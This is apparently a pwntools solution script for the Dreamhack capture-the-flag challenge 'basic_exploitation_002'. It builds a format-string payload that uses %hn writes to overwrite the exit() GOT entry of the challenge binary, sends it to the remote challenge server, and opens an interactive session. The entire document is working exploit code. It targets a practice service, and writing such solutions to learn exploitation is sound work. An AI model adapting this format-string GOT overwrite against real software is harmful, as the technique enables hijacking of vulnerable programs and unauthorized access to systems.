from pwn import *

port = 16618
rem = remote("host1.dreamhack.games", port)

elf = ELF("./Pwnable/basic_exploitation_002/problem/basic_exploitation_002")

exit_got = elf.got['exit']
payload = p32(exit_got + 2) + p32(exit_got)
payload += '%2044c%1$hn%32261c%2$hn'.encode()

rem.sendline(payload)

rem.interactive()